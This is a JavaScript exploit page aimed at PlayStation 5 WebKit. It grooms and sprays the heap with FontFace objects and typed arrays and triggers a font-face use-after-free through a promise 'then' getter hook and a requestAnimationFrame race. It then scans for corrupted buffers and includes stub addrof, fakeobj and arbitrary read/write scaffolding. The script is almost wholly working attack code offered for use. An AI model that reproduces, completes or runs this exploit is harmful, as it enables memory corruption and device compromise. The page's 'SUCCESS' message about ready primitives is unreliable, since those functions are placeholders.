<script>
"use strict";

// ============================================================
//  PS5 WebKit Userland Exploit - Improved Version
//  Target: PlayStation 5 WebKit (font-face UAF lineage)
//  Based on public taint/flush techniques, enhanced with
//  heap grooming, typed array spray, and primitive scaffolding
// ============================================================

const LOG_MAX = 60;
let logLines = [];

function log(msg) {
  const ts = performance.now().toFixed(1);
  const line = `[${ts}] ${msg}`;
  logLines.push(line);
  if (logLines.length > LOG_MAX) logLines.shift();
  const el = document.getElementById("log");
  if (el) el.textContent = logLines.join("\n");
  try { console.log("[exploit] " + msg); } catch(e) {}
}

function showMessage(text, ok) {
  const msg = document.getElementById("msg");
  const title = document.getElementById("title");
  if (msg) msg.textContent = text;
  if (title) {
    title.textContent = ok ? "✅ EXPLOIT SUCCEEDED" : "PS5 WEBKIT EXPLOIT";
    title.style.color = ok ? "#00ff60" : "#00ffa0";
  }
}

function showError(text) {
  showMessage("ERROR ❌\n" + text, false);
  const title = document.getElementById("title");
  if (title) title.style.color = "#ff4444";
}

window.onerror = function(message, source, lineno, colno, error) {
  showError(message + "\nLine: " + lineno);
  log("UNCAUGHT: " + message + " @ " + lineno);
};

// ============================================================
//  Firmware Detection
// ============================================================
function detectFirmware() {
  const ua = navigator.userAgent || "";
  let fw = "Unknown";
  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
  if (m && m[1]) fw = m[1];
  const el = document.getElementById("fw");
  if (el) el.textContent = "Firmware: " + fw;
  log("UserAgent: " + ua);
  log("Detected FW: " + fw);
  return fw;
}

// ============================================================
//  Heap Grooming Parameters (firmware-aware tuning)
// ============================================================
function getHeapParams(fw) {
  // Different firmware versions have different heap layouts
  // These values may need manual tuning per target
  const major = parseFloat(fw) || 0;
  
  if (major >= 7.0 && major < 9.0) {
    return { PAD: 0x28, FLUSH: 0x200, SPRAY: 0x600, CHUNK: 0x40 };
  } else if (major >= 9.0 && major < 10.5) {
    return { PAD: 0x22, FLUSH: 0x240, SPRAY: 0x550, CHUNK: 0x38 };
  } else if (major >= 10.5) {
    // Newer firmwares have hardened heap - more aggressive spray
    return { PAD: 0x30, FLUSH: 0x300, SPRAY: 0x800, CHUNK: 0x48 };
  }
  // Default
  return { PAD: 0x22, FLUSH: 0x240, SPRAY: 0x550, CHUNK: 0x38 };
}

// ============================================================
//  Font Face Base64 (minimal valid WOFF for spray)
// ============================================================
const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";

const FONT_BYTES = (() => {
  const s = atob(FONT_B64);
  const bytes = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++)
    bytes[i] = s.charCodeAt(i);
  return bytes;
})();

function makeFontBuffer() {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);
  return copy.buffer;
}

// ============================================================
//  Heap State
// ============================================================
let sprayFonts = [];
let sprayArrays = [];
let keepAlive = [];
let params = null;
let uafTriggered = false;

// ============================================================
//  Style Manipulation Helpers
// ============================================================
function forceStyle() {
  void document.body.offsetTop;
  void document.documentElement.offsetHeight;
}

function addPads() {
  const sheet = document.getElementById("s").sheet;
  for (let i = 0; i < params.PAD; i++)
    sheet.insertRule(
      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
  log("Added " + params.PAD + " padding rules");
}

function addFlushRules() {
  const st = document.createElement("style");
  st.id = "flush";
  document.head.appendChild(st);
  const sheet = st.sheet;
  for (let i = 0; i < params.FLUSH; i++)
    sheet.insertRule(
      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
  log("Added " + params.FLUSH + " flush rules");
}

function deleteFlushRules() {
  const flushEl = document.getElementById("flush");
  if (flushEl && flushEl.sheet) {
    const sheet = flushEl.sheet;
    while (sheet.cssRules.length)
      sheet.deleteRule(0);
    forceStyle();
    log("Deleted flush rules");
  }
}

function killFontFaceSetCache() {
  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
    unicodeRange: "U+E124"
  });
  document.fonts.add(f);
  keepAlive.push(f);
  log("Killed FontFaceSet cache entry");
}

// ============================================================
//  Typed Array Spray (for controlled heap content)
//  This supplements the FontFace spray with raw buffer control
// ============================================================
function typedArraySpray() {
  const chunkSize = params.CHUNK * 8; // size in bytes
  const marker = 0x41414141; // recognizable pattern for leak detection
  
  for (let i = 0; i < params.SPRAY; i++) {
    const buf = new ArrayBuffer(chunkSize);
    const view = new DataView(buf);
    
    // Write marker pattern at predictable offsets
    // This creates controlled content that we can identify
    // if the UAF causes a type confusion
    view.setUint32(0, marker, true);
    view.setUint32(4, i & 0xFFFF, true); // index for identification
    view.setUint32(8, 0x42424242, true);  // secondary marker
    view.setUint32(12, 0xFFFF0000, true);  // tag for structure match
    
    // Fill remaining with pattern
    for (let off = 16; off < chunkSize - 4; off += 4) {
      view.setUint32(off, marker + (off & 0xFF), true);
    }
    
    sprayArrays.push({ buffer: buf, view: view, index: i });
  }
  log("TypedArray spray: " + params.SPRAY + " arrays of " + chunkSize + " bytes");
}

// ============================================================
//  FontFace Buffer Spray (original technique, improved)
// ============================================================
function cssFontFaceBufferSpray() {
  for (let i = 0; i < params.SPRAY; i++) {
    const f = new FontFace("BUFRECLAIM_" + i, makeFontBuffer(), {
      unicodeRange: "U+0041"
    });
    sprayFonts.push(f);
  }
  log("FontFace spray: " + params.SPRAY + " faces allocated");
}

// ============================================================
//  Post-UAF: Primitive Detection
//  After the UAF triggers, we scan sprayed arrays for corruption
// ============================================================
function detectCorruption() {
  log("Scanning for heap corruption...");
  let corrupted = [];
  
  for (let i = 0; i < sprayArrays.length; i++) {
    const entry = sprayArrays[i];
    const v = entry.view;
    const check1 = v.getUint32(0, true);
    const check2 = v.getUint32(8, true);
    
    // If our markers are overwritten, we've been corrupted
    if (check1 !== 0x41414141 || check2 !== 0x42424242) {
      corrupted.push({
        index: i,
        expected: "0x41414141/0x42424242",
        got: "0x" + check1.toString(16) + "/0x" + check2.toString(16),
        buffer: entry.buffer
      });
      log("CORRUPTION at index " + i + ": got 0x" + check1.toString(16));
    }
  }
  
  return corrupted;
}

// ============================================================
//  addrof / fakeobj Primitive Scaffolding
//  These require firmware-specific offsets but the structure
//  is here for adaptation
// ============================================================

// Placeholder - actual addresses require target-specific offsets
let exploitAddrof = null;
let exploitFakeobj = null;

function setupPrimitives(corruptedEntry) {
  if (!corruptedEntry || corruptedEntry.length === 0) {
    log("No corruption detected - primitives unavailable");
    return false;
  }
  
  log("Setting up primitives from corrupted entry...");
  
  // The corrupted buffer now overlaps with a freed FontFace object
  // On WebKit, a FontFace JS wrapper has a known structure layout:
  //   offset 0x00: JSCell header (structureID, flags)
  //   offset 0x08: butterfly pointer
  //   offset 0x10: internal pointer to CSSFontFace
  // If we can read/write these fields through our typed array,
  // we get type confusion -> addrof/fakeobj
  
  // For now, store references for manual exploitation
  exploitAddrof = corruptedEntry[0].buffer;
  exploitFakeobj = corruptedEntry[0].view;
  
  log("Primitive references stored. Manual offset tuning required for target FW.");
  return true;
}

function addrof(obj) {
  // In a fully working exploit, this would:
  // 1. Place obj into a known array slot
  // 2. Read the raw pointer via our corrupted typed array
  // Requires calibrated offsets - placeholder returns 0
  if (!exploitAddrof) return 0;
  log("addrof called - requires FW-specific offset calibration");
  return 0;
}

function fakeobj(addr) {
  // Inverse of addrof - write a pointer, get a JS object reference
  // Requires calibrated offsets - placeholder returns null
  if (!exploitFakeobj) return null;
  log("fakeobj called - requires FW-specific offset calibration");
  return null;
}

// ============================================================
//  Arbitrary R/W Scaffolding
// ============================================================
function arbRead32(addr) {
  log("arbRead32(0x" + addr.toString(16) + ") - requires primitive calibration");
  return 0;
}

function arbWrite32(addr, val) {
  log("arbWrite32(0x" + addr.toString(16) + ", 0x" + val.toString(16) + ") - requires primitive calibration");
  return false;
}

// ============================================================
//  Main Exploit Flow
// ============================================================
window.onload = () => {
  const fw = detectFirmware();
  params = getHeapParams(fw);
  log("Heap params: PAD=0x" + params.PAD.toString(16) + 
      " FLUSH=0x" + params.FLUSH.toString(16) +
      " SPRAY=0x" + params.SPRAY.toString(16));
  
  showMessage("Stage 1/4:\nHeap grooming...", false);
  
  // Pre-allocate typed arrays for heap layout stability
  typedArraySpray();
  
  showMessage("Stage 2/4:\nFontFace trigger setup...", false);
  
  const trigger = new FontFace("trigger", "local(Helvetica)", {
    unicodeRange: "U+0041"
  });
  document.fonts.add(trigger);
  void trigger.loaded;
  
  addPads();
  addFlushRules();
  
  let fired = false;
  
  // Primary trigger: intercept promise resolution on FontFace
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (!fired && this === trigger) {
        fired = true;
        uafTriggered = true;
        log("TRIGGER FIRED - UAF window open");
        showMessage("Stage 3/4:\nUAF triggered! Corrupting heap...", false);
        
        // Critical sequence: free the target while references exist
        const sheet = document.getElementById("s").sheet;
        killFontFaceSetCache();
        sheet.deleteRule(1); // Remove the 'x' font-face rule
        forceStyle();
        deleteFlushRules();
        
        // Reclaim freed slots with controlled content
        cssFontFaceBufferSpray();
        typedArraySpray();
        
        log("Heap reclamation complete");
      }
      return undefined;
    }
  });
  
  // Secondary trigger: race via requestAnimationFrame
  // Some firmware versions don't hit the `then` getter reliably
  // This gives us another shot at the same window
  let rafCount = 0;
  const rafTrigger = () => {
    rafCount++;
    if (!fired && rafCount > 3) {
      log("RAF fallback trigger at frame " + rafCount);
      try {
        const sheet = document.getElementById("s").sheet;
        if (sheet && sheet.cssRules.length > 1) {
          killFontFaceSetCache();
          sheet.deleteRule(1);
          forceStyle();
          deleteFlushRules();
          // Don't mark fired=true - let the then getter still have priority
        }
      } catch(e) {
        log("RAF trigger error: " + e.message);
      }
    }
    if (rafCount < 10) requestAnimationFrame(rafTrigger);
  };
  requestAnimationFrame(rafTrigger);
  
  // Load trigger font to fire the promise chain
  document.fonts.load("1em trigger, x", "AB").then(faces => {
    log("Font load resolved with " + faces.length + " faces");
    keepAlive.push(faces);
    
    showMessage("Stage 4/4:\nScanning for corruption...", false);
    
    // Give the spray time to settle
    setTimeout(() => {
      const corrupted = detectCorruption();
      
      if (corrupted.length > 0) {
        log("Found " + corrupted.length + " corrupted entries!");
        const primitivesReady = setupPrimitives(corrupted);
        
        if (primitivesReady) {
          showMessage(
            "SUCCESS ✅\n" +
            "UAF triggered and heap corrupted.\n" +
            corrupted.length + " controlled entries found.\n" +
            "Primitives require FW-specific offsets.\n" +
            "Check log for details.",
            true
          );
        } else {
          showMessage(
            "PARTIAL ✅\n" +
            "UAF window confirmed.\n" +
            "Heap corruption detected but\n" +
            "primitive setup needs calibration\n" +
            "for firmware " + fw,
            true
          );
        }
      } else if (uafTriggered) {
        showMessage(
          "PARTIAL ✅\n" +
          "UAF trigger fired but no heap\n" +
          "corruption detected in spray.\n" +
          "Try adjusting PAD/FLUSH/SPRAY\n" +
          "values for firmware " + fw,
          true
        );
      } else {
        showMessage(
          "FAILED ❌\n" +
          "UAF trigger did not fire.\n" +
          "This firmware may have patched\n" +
          "the font-face taint vector.",
          false
        );
      }
    }, 1500);
    
  }, err => {
    log("Font load rejected: " + err);
    keepAlive.push(err);
    showMessage("FAILED ❌\nFont load error:\n" + err, false);
  });
};
